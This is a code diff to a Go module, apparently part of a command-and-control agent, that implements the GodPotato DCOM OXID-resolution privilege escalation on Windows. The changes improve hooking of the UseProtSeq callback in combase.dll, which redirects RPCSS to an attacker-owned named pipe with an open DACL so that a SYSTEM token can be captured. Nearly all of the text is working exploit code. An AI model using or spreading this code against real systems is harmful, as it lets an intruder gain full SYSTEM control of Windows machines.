@@ -26,6 +26,7 @@ import (
 // References:
 // - https://github.com/BeichenDream/GodPotato
 // - https://github.com/tylerdotrar/SigmaPotato
+// - https://github.com/safedv/RustPotato
 
 // orcbGUID is the ORCB RPC interface GUID (18f70770-8e64-11cf-9af1-0020af6e72f4)
 // in little-endian byte order for memory scanning in combase.dll.
@@ -48,49 +49,6 @@ var iidIUnknown = [16]byte{
 	0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
 }
 
-// DUALSTRINGARRAY pointing to our named pipe
-// Format: ncacn_np (tower 0x0F) + pipe path + security binding
-func buildDualStringArray(pipeName string) []byte {
-	// String binding: tower protocol (2 bytes) + pipe path (UTF-16) + null terminator
-	// ncacn_np = 0x000F
-	towerID := uint16(0x000F)
-	pipePathUTF16 := utf16Encode(pipeName)
-	stringBinding := make([]byte, 2+len(pipePathUTF16)*2+2) // tower + path + null
-	binary.LittleEndian.PutUint16(stringBinding[0:2], towerID)
-	for i, c := range pipePathUTF16 {
-		binary.LittleEndian.PutUint16(stringBinding[2+i*2:4+i*2], c)
-	}
-	// null terminator for string binding
-	stringBindingEnd := 2 + len(pipePathUTF16)*2 + 2
-	stringBinding = stringBinding[:stringBindingEnd]
-
-	// End of string bindings marker (2 null bytes)
-	stringBinding = append(stringBinding, 0, 0)
-
-	stringEntries := len(stringBinding) / 2
-
-	// Security binding: AuthnSvc (2 bytes) + AuthzSvc (2 bytes) + PrincName null
-	securityBinding := []byte{
-		0x0A, 0x00, // AuthnSvc = RPC_C_AUTHN_WINNT (NTLM)
-		0xFF, 0xFF, // AuthzSvc = 0xFFFF
-		0x00, 0x00, // Empty principal name (null terminator)
-	}
-	// End of security bindings marker
-	securityBinding = append(securityBinding, 0, 0)
-
-	securityEntries := len(securityBinding) / 2
-	totalEntries := stringEntries + securityEntries
-
-	// Build DUALSTRINGARRAY header
-	result := make([]byte, 4+totalEntries*2)
-	binary.LittleEndian.PutUint16(result[0:2], uint16(totalEntries))
-	binary.LittleEndian.PutUint16(result[2:4], uint16(stringEntries))
-	copy(result[4:], stringBinding)
-	copy(result[4+stringEntries*2:], securityBinding)
-
-	return result
-}
-
 func utf16Encode(s string) []uint16 {
 	result, _ := syscall.UTF16FromString(s)
 	// Remove trailing null
@@ -102,41 +60,46 @@ func utf16Encode(s string) []uint16 {
 
 // potatoState holds the mutable state for the GodPotato technique
 type potatoState struct {
-	mu           sync.Mutex
-	systemToken  windows.Token
-	tokenCaptured bool
-	pipeName     string
-	hookError    string
-	origFuncPtr  uintptr
+	mu             sync.Mutex
+	systemToken    windows.Token
+	tokenCaptured  bool
+	pipeName       string
+	pipeUniqueName string
+	hookError      string
+	origFuncPtr    uintptr
+	hookCalled     bool
+	paramCount     int
 }
 
 var potatoGlobal potatoState
 
 // Windows API procs for COM and memory operations
 var (
-	ole32DLL               = windows.NewLazySystemDLL("ole32.dll")
-	procCoInitializeEx     = ole32DLL.NewProc("CoInitializeEx")
-	procCoUninitialize     = ole32DLL.NewProc("CoUninitialize")
-	procCoUnmarshalIntf    = ole32DLL.NewProc("CoUnmarshalInterface")
-	procCreateObjrefMonik  = ole32DLL.NewProc("CreateObjrefMoniker")
-	procCreateBindCtx      = ole32DLL.NewProc("CreateBindCtx")
-	procCoTaskMemFree      = ole32DLL.NewProc("CoTaskMemFree")
+	ole32DLL              = windows.NewLazySystemDLL("ole32.dll")
+	procCoInitializeEx    = ole32DLL.NewProc("CoInitializeEx")
+	procCoUninitialize    = ole32DLL.NewProc("CoUninitialize")
+	procCoUnmarshalIntf   = ole32DLL.NewProc("CoUnmarshalInterface")
+	procCreateObjrefMonik = ole32DLL.NewProc("CreateObjrefMoniker")
+	procCreateBindCtx     = ole32DLL.NewProc("CreateBindCtx")
+	procCoTaskMemFree     = ole32DLL.NewProc("CoTaskMemFree")
 
-	procVirtualQuery = kernel32NP.NewProc("VirtualQuery")
+	procVirtualQuery   = kernel32NP.NewProc("VirtualQuery")
+	procGetProcessHeap = kernel32NP.NewProc("GetProcessHeap")
+	procHeapAlloc      = kernel32NP.NewProc("HeapAlloc")
 	// procGetModuleHandleW is declared in spawn.go
 )
 
 // RPC_SERVER_INTERFACE represents the RPC server interface structure in combase.dll
 type rpcServerInterface struct {
-	Length            uint32
-	InterfaceID       [20]byte // RPC_IF_ID = GUID (16) + Version (4)
-	TransferSyntax    [20]byte
-	DispatchTable     uintptr  // *RPC_DISPATCH_TABLE
+	Length                  uint32
+	InterfaceID             [20]byte // RPC_IF_ID = GUID (16) + Version (4)
+	TransferSyntax          [20]byte
+	DispatchTable           uintptr // *RPC_DISPATCH_TABLE
 	RpcProtseqEndpointCount uint32
-	RpcProtseqEndpoint uintptr
-	DefaultManagerEpv  uintptr
-	InterpreterInfo    uintptr // *MIDL_SERVER_INFO
-	Flags             uint32
+	RpcProtseqEndpoint      uintptr
+	DefaultManagerEpv       uintptr
+	InterpreterInfo         uintptr // *MIDL_SERVER_INFO
+	Flags                   uint32
 }
 
 type rpcDispatchTable struct {
@@ -146,10 +109,137 @@ type rpcDispatchTable struct {
 }
 
 type midlServerInfo struct {
-	StubDesc       uintptr
-	DispatchTable  uintptr // *funcptr array — same as RPC dispatch
-	ProcString     uintptr
+	StubDesc        uintptr
+	DispatchTable   uintptr // *funcptr array — the manager routines
+	ProcString      uintptr
 	FmtStringOffset uintptr
+}
+
+// readUseProtSeqParamCount reads the UseProtSeq parameter count from the MIDL
+// NDR format string. GodPotato reads this at ProcString + FmtStringOffset[0] + 19.
+// The parameter count varies by Windows version (typically 5-6 on modern Windows).
+func readUseProtSeqParamCount(midlInfo *midlServerInfo) (int, error) {
+	if midlInfo.ProcString == 0 || midlInfo.FmtStringOffset == 0 {
+		return 0, fmt.Errorf("ProcString or FmtStringOffset is null")
+	}
+	// FmtStringOffset is an array of uint16; read offset for method 0 (UseProtSeq)
+	fmtOffset0 := *(*uint16)(unsafe.Pointer(midlInfo.FmtStringOffset))
+	// Parameter count is at offset 19 within the Oif procedure header
+	paramCount := int(*(*byte)(unsafe.Pointer(midlInfo.ProcString + uintptr(fmtOffset0) + 19)))
+	if paramCount < 4 || paramCount > 14 {
+		return 0, fmt.Errorf("unexpected UseProtSeq parameter count: %d", paramCount)
+	}
+	return paramCount, nil
+}
+
+// handleUseProtSeq is the core hook handler. It allocates a DUALSTRINGARRAY
+// containing an ncacn_np binding that points to our named pipe, then writes
+// the pointer into the ppdsaNewBindings output parameter (pointer-to-pointer).
+// This matches GodPotato's approach: text-based binding strings, HeapAlloc'd memory.
+func handleUseProtSeq(ppdsaNewBindings uintptr) uintptr {
+	if ppdsaNewBindings == 0 {
+		return 0
+	}
+
+	name := potatoGlobal.pipeUniqueName
+	endpoints := []string{
+		fmt.Sprintf(`ncacn_np:localhost/pipe/%s[\pipe\epmapper]`, name),
+		"ncacn_ip_tcp:127.0.0.1",
+	}
+
+	// Calculate entry count (in uint16 units)
+	// Each endpoint: len(chars) + 1 (null terminator)
+	// Plus: 1 (double-null end of strings) + 2 (empty security binding + null)
+	entriesCount := 3
+	for _, ep := range endpoints {
+		entriesCount += len(ep) + 1
+	}
+
+	bufferSize := entriesCount*2 + 10 // bytes, with padding
+
+	// Allocate memory from process heap (HEAP_ZERO_MEMORY = 0x08)
+	hHeap, _, _ := procGetProcessHeap.Call()
+	if hHeap == 0 {
+		return 0
+	}
+	buf, _, _ := procHeapAlloc.Call(hHeap, 0x08, uintptr(bufferSize))
+	if buf == 0 {
+		return 0
+	}
+
+	// Write DUALSTRINGARRAY header
+	offset := uintptr(0)
+	// wNumEntries
+	*(*uint16)(unsafe.Pointer(buf + offset)) = uint16(entriesCount)
+	offset += 2
+	// wSecurityOffset (offset to security section)
+	*(*uint16)(unsafe.Pointer(buf + offset)) = uint16(entriesCount - 2)
+	offset += 2
+
+	// Write each endpoint as UTF-16LE characters
+	for _, ep := range endpoints {
+		for _, ch := range ep {
+			*(*uint16)(unsafe.Pointer(buf + offset)) = uint16(ch)
+			offset += 2
+		}
+		offset += 2 // null terminator (buffer is zeroed)
+	}
+
+	// Write the pointer to *ppdsaNewBindings (it's a DUALSTRINGARRAY**)
+	*(*uintptr)(unsafe.Pointer(ppdsaNewBindings)) = buf
+
+	// Signal that the hook was called (diagnostic)
+	potatoGlobal.mu.Lock()
+	potatoGlobal.hookCalled = true
+	potatoGlobal.mu.Unlock()
+
+	return 0 // RPC_S_OK
+}
+
+// createHookCallback creates a syscall.NewCallback with the correct number of
+// parameters for this Windows version. The ppdsaNewBindings output is always
+// the second-to-last parameter, regardless of the total count.
+func createHookCallback(paramCount int) (uintptr, error) {
+	switch paramCount {
+	case 4:
+		return syscall.NewCallback(func(a0, a1, a2, a3 uintptr) uintptr {
+			return handleUseProtSeq(a2) // second-to-last
+		}), nil
+	case 5:
+		return syscall.NewCallback(func(a0, a1, a2, a3, a4 uintptr) uintptr {
+			return handleUseProtSeq(a3)
+		}), nil
+	case 6:
+		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5 uintptr) uintptr {
+			return handleUseProtSeq(a4)
+		}), nil
+	case 7:
+		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6 uintptr) uintptr {
+			return handleUseProtSeq(a5)
+		}), nil
+	case 8:
+		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6, a7 uintptr) uintptr {
+			return handleUseProtSeq(a6)
+		}), nil
+	case 9:
+		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
+			return handleUseProtSeq(a7)
+		}), nil
+	case 10:
+		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) uintptr {
+			return handleUseProtSeq(a8)
+		}), nil
+	case 11:
+		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10 uintptr) uintptr {
+			return handleUseProtSeq(a9)
+		}), nil
+	case 12:
+		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11 uintptr) uintptr {
+			return handleUseProtSeq(a10)
+		}), nil
+	default:
+		return 0, fmt.Errorf("unsupported UseProtSeq parameter count: %d (expected 4-12)", paramCount)
+	}
 }
 
 // getSystemViaPotato implements the GodPotato DCOM OXID resolution exploit.
@@ -214,6 +304,17 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 		}
 	}
 
+	// Read parameter count from MIDL format string (varies by Windows version)
+	paramCount, paramErr := readUseProtSeqParamCount(midlInfo)
+	if paramErr != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Failed to read UseProtSeq param count: %v", paramErr),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	potatoGlobal.paramCount = paramCount
+
 	// Read the original UseProtSeq function pointer (index 0)
 	useProtSeqSlot := midlInfo.DispatchTable
 	origFunc := *(*uintptr)(unsafe.Pointer(useProtSeqSlot))
@@ -232,10 +333,13 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	}
 
 	// Phase 4: Create named pipe server
-	pipeName := fmt.Sprintf(`\\.\pipe\fawkes_%d\pipe\epmapper`, time.Now().UnixNano()%100000)
+	pipeUniqueName := fmt.Sprintf("fawkes_%d", time.Now().UnixNano()%100000)
+	pipeName := fmt.Sprintf(`\\.\pipe\%s\pipe\epmapper`, pipeUniqueName)
 	potatoGlobal.pipeName = pipeName
+	potatoGlobal.pipeUniqueName = pipeUniqueName
 	potatoGlobal.tokenCaptured = false
 	potatoGlobal.systemToken = 0
+	potatoGlobal.hookCalled = false
 
 	// Create the pipe with permissive DACL
 	sd, sdErr := windows.NewSecurityDescriptor()
@@ -248,7 +352,7 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	}
 	if err := sd.SetDACL(nil, true, false); err != nil {
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("SetDACL: %v", sdErr),
+			Output:    fmt.Sprintf("SetDACL: %v", err),
 			Status:    "error",
 			Completed: true,
 		}
@@ -289,12 +393,15 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	overlapped.HEvent = event
 	procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
 
-	// Phase 5: Hook UseProtSeq to return our pipe binding
-	// Extract pipe path component for the DUALSTRINGARRAY
-	// The DUALSTRINGARRAY string binding needs just the pipe path without \\.\pipe\ prefix
-	pipeShortName := strings.TrimPrefix(pipeName, `\\.\pipe\`)
-
-	hookCallback := syscall.NewCallback(makeUseProtSeqHook(pipeShortName))
+	// Phase 5: Create hook callback with correct parameter count and install
+	hookCallback, hookErr := createHookCallback(paramCount)
+	if hookErr != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Failed to create hook callback: %v", hookErr),
+			Status:    "error",
+			Completed: true,
+		}
+	}
 
 	// Make the dispatch table writable
 	var oldProtect uint32
@@ -310,7 +417,7 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	// Replace the function pointer
 	*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = hookCallback
 
-	// Restore protection (best effort)
+	// Restore protection and original function pointer on exit
 	defer func() {
 		*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = origFunc
 		windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), oldProtect, &oldProtect)
@@ -322,7 +429,11 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	// Phase 7: Wait for pipe connection (SYSTEM connecting)
 	waitResult, _ := windows.WaitForSingleObject(event, 10000) // 10s timeout
 	if waitResult != windows.WAIT_OBJECT_0 {
-		errMsg := fmt.Sprintf("RPCSS did not connect to pipe within timeout.\nPipe: %s", pipeName)
+		hookStatus := "NOT called"
+		if potatoGlobal.hookCalled {
+			hookStatus = "called"
+		}
+		errMsg := fmt.Sprintf("RPCSS did not connect to pipe within timeout.\nPipe: %s\nHook was %s (paramCount=%d)", pipeName, hookStatus, paramCount)
 		if triggerErr != nil {
 			errMsg += fmt.Sprintf("\nTrigger error: %v", triggerErr)
 		}
@@ -401,6 +512,7 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	sb.WriteString("=== GETSYSTEM SUCCESS (DCOM/Potato) ===\n\n")
 	sb.WriteString(fmt.Sprintf("Technique: DCOM OXID resolution hook (GodPotato)\n"))
 	sb.WriteString(fmt.Sprintf("Pipe: %s\n", pipeName))
+	sb.WriteString(fmt.Sprintf("ParamCount: %d\n", paramCount))
 	if oldIdentity != "" {
 		sb.WriteString(fmt.Sprintf("Old: %s\n", oldIdentity))
 	}
@@ -481,27 +593,6 @@ func scanForGUID(base, size uintptr, pattern []byte) (uintptr, error) {
 	}
 
 	return 0, fmt.Errorf("ORCB GUID pattern not found in %d bytes of combase.dll", size)
-}
-
-// makeUseProtSeqHook creates the hooked UseProtSeq callback function.
-// This returns a DUALSTRINGARRAY pointing to our named pipe.
-func makeUseProtSeqHook(pipeShortName string) func(a1, a2, a3, a4, a5, a6 uintptr) uintptr {
-	dsArray := buildDualStringArray(pipeShortName)
-
-	return func(a1, a2, a3, a4, a5, a6 uintptr) uintptr {
-		// The UseProtSeq callback receives the DUALSTRINGARRAY output pointer
-		// as one of its parameters. The exact parameter depends on Windows version.
-		// We need to write our DUALSTRINGARRAY to the output buffer.
-		//
-		// In practice, the 3rd or 4th parameter is the output pointer.
-		// We try writing to a3 first (most common on x64 Win10+).
-		if a3 != 0 {
-			// Write DUALSTRINGARRAY size first, then copy data
-			dst := unsafe.Slice((*byte)(unsafe.Pointer(a3)), len(dsArray))
-			copy(dst, dsArray)
-		}
-		return 0 // Success
-	}
 }
 
 // extractProcessOXID creates a COM object, marshals it via CreateObjrefMoniker,
@@ -649,14 +740,14 @@ func triggerOXIDResolution(oxid [8]byte, oid [8]byte, ipid [16]byte) error {
 	// Build crafted OBJREF with our OXID but TCP bindings to 127.0.0.1
 	objref := buildCraftedOBJREF(oxid, oid, ipid)
 
-	// Step 3: Create IStream wrapping our OBJREF
+	// Create IStream wrapping our OBJREF
 	stream, streamRelease, err := createOBJREFStream(objref)
 	if err != nil {
 		return fmt.Errorf("create IStream: %w", err)
 	}
 	defer streamRelease()
 
-	// Step 4: Call CoUnmarshalInterface to trigger OXID resolution
+	// Call CoUnmarshalInterface to trigger OXID resolution.
 	// This causes COM to contact RPCSS to resolve the OXID.
 	// Since the DUALSTRINGARRAY specifies TCP (which we haven't registered),
 	// RPCSS calls the ORCB UseProtSeq callback (which we hooked) to ask us
